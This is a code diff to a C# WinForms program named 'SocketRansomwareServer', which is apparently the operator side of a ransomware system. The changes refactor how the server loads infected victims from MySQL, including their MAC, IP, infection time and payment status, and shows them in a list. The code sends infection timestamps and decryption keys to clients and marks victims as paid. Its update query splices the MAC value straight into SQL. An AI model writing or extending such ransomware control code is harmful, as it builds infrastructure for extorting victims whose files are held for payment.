@@ -14,11 +14,13 @@ using System.Diagnostics;
 using System.Drawing.Imaging;
 using MySql.Data.MySqlClient;
 using System.Security.Cryptography;
+using System.Collections;
 
 namespace SocketRansomwareServer
 {
     public partial class Form1 : Form
     {
+        
         public Form1()
         {
             InitializeComponent();
@@ -52,7 +54,7 @@ namespace SocketRansomwareServer
 
         class clients
         {
-            private delegate void SafeCallDelegate(ClientVO vo);
+            private List<ClientVO> clientList = new List<ClientVO>();
             TcpClient tcp; //해당쓰레드에서 담당할 클라이언트 객체
             ListView listView; //리스트박스를 다른클래스에서 조정하기위해 만든 listBox
             string _mac = null;
@@ -105,15 +107,9 @@ namespace SocketRansomwareServer
                         //Console.WriteLine($"이미 존재, {table.GetString("start_date")}");
                         string start_date = table.GetDateTime("start_date").ToString("yyyy-MM-dd HH:mm:ss");
                         SendDataClient("timestamp;infection;" + start_date + ";current;" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
-                        //클라이언트 정보 listView에 전달
-                        ClientVO vo = new ClientVO();
-                        vo.setMac(mac);
-                        vo.setInfectionTime(start_date);
-                        vo.setIp(table.GetString("ip"));
-                        vo.setIsPayment(table.GetBoolean("is_payment"));
-                        UpdateListViewSafe(vo);
                  
                         table.Close();
+                        getClientsDB();
 
                     }
                     else
@@ -133,13 +129,7 @@ namespace SocketRansomwareServer
                         Console.WriteLine(key);
                         command = new MySqlCommand(insertQuery, DB.Instance._connection);
 
-                        //클라이언트 정보 listView에 전달
-                        ClientVO vo = new ClientVO();
-                        vo.setMac(mac);
-                        vo.setInfectionTime(start_date);
-                        vo.setIp(ip);
-                        vo.setIsPayment(false);
-                        UpdateListViewSafe(vo);
+                        getClientsDB();
 
                         if (command.ExecuteNonQuery() == 1)
                         {
@@ -157,6 +147,32 @@ namespace SocketRansomwareServer
                 {
                     Console.WriteLine(e.Message);
                 }
+            }
+
+            private void getClientsDB()
+            {
+                clientList.Clear();
+                string query = string.Format("select * from client");
+                MySqlCommand command = new MySqlCommand(query, DB.Instance._connection);
+                MySqlDataReader table = command.ExecuteReader();
+
+                if(table.HasRows)
+                {
+                    while(table.Read())
+                    {
+                        ClientVO vo = new ClientVO();
+                        vo.setMac(table.GetString("mac"));
+                        vo.setIp(table.GetString("ip"));
+                        vo.setInfectionTime(table.GetString("start_date"));
+                        vo.setIsPayment(table.GetBoolean("is_payment"));
+
+                        clientList.Add(vo);
+                    }
+                }
+                table.Close();
+
+                UpdateListViewSafe();
+                
             }
 
             private void GetInfectionTime()
@@ -189,6 +205,17 @@ namespace SocketRansomwareServer
                     SendDataClient(key);
                 }
                 table.Close();
+
+                //is_payment true로 업데이트
+                query = string.Format("update client set is_payment=1 where mac = '{0}'", mac);
+                command = new MySqlCommand(query, DB.Instance._connection);
+
+                if (command.ExecuteNonQuery() == 1)
+                {
+                    Console.WriteLine("DB 저장 성공");
+                    getClientsDB();
+                }
+                else Console.WriteLine("DB 저장 실패");
             }
 
             //클라이언트로 데이터 전송
@@ -211,24 +238,47 @@ namespace SocketRansomwareServer
 
 
             }
-            private void UpdateListViewSafe(ClientVO vo)
-            {
+            private void UpdateListViewSafe()
+            { 
                 if (listView.InvokeRequired)
                 {
-                    SafeCallDelegate d = new SafeCallDelegate(UpdateListViewSafe);
-                    listView.Invoke(d, new object[] { vo });
+                    listView.BeginInvoke(
+                        (System.Action)(() =>
+                        {
+                            listView.BeginUpdate();
+                            listView.Items.Clear();
+                            if (clientList.Count != 0)
+                            {
+                                foreach (ClientVO vo in clientList)
+                                {
+                                    ListViewItem lvi = new ListViewItem(vo.getMac());
+                                    lvi.SubItems.Add(vo.getIp());
+                                    lvi.SubItems.Add(vo.getInfectionTime());
+                                    lvi.SubItems.Add(vo.getIsPayment().ToString());
+                                    //listView.Items.Add(text); //표시
+                                    listView.Items.Add(lvi);
+                                }
+                            }
+                            listView.EndUpdate();
+                        }));
 
                 }
                 else
                 {
                     listView.BeginUpdate();
-                    ListViewItem lvi = new ListViewItem(vo.getMac());
-                    lvi.SubItems.Add(vo.getIp());
-                    lvi.SubItems.Add(vo.getInfectionTime());
-                    lvi.SubItems.Add(vo.getIsPayment().ToString());
-                    //listView.Items.Add(text); //표시
-                    listView.Items.Add(lvi);
-
+                    listView.Items.Clear();
+                    if (clientList.Count != 0)
+                    {
+                        foreach (ClientVO vo in clientList)
+                        {
+                            ListViewItem lvi = new ListViewItem(vo.getMac());
+                            lvi.SubItems.Add(vo.getIp());
+                            lvi.SubItems.Add(vo.getInfectionTime());
+                            lvi.SubItems.Add(vo.getIsPayment().ToString());
+                            //listView.Items.Add(text); //표시
+                            listView.Items.Add(lvi);
+                        }
+                    }
                     listView.EndUpdate();
                 }
             }
